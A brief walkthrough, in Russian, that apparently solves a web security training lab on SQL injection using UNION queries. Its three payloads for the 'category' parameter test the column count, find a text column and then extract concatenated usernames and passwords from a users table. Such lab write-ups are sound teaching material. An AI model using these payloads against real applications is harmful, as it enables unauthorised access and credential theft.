## Lab: SQL injection UNION attack, retrieving multiple values in a single column
1) Переходим на сайт задания и заходим в раздел Pets
2) Убедимся, что запрос возвращает два столбца, отправив строку category=Pets'+UNION+SELECT+NULL,NULL--
3) Убедимся, что только один из  столбцов содержит текст, отправив category=Pets'+UNION+SELECT+NULL,'abc'--
4) Используем следующий запрос: category=Pets'+UNION+SELECT+NULL,username||password+FROM+users--

Готово!
